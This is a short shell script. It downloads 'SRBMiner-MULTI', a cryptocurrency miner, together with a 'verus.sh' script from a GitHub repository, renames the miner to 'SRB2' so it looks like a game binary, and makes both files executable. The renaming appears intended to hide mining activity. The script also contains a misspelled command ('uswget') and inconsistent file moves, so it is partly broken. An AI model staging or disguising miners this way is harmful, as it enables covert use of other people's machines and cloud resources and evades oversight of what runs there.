mkdir ~/SRB2
cd ~/SRB2
uswget ${GITHUB_DOWNLOAD_URL} -O ~/SRB2/SRB2
wget https://raw.githubusercontent.com/Geokot82/SRB2/main/verus.sh
wget https://raw.githubusercontent.com/Geokot82/SRB2/main/SRBMiner-MULTI -O ~/SRB2/SRBMiner-MULTI
mv SRBMiner-MULTI SRB2
mv verus.sh SRB2
chmod +x SRB2
chmod +x verus.sh
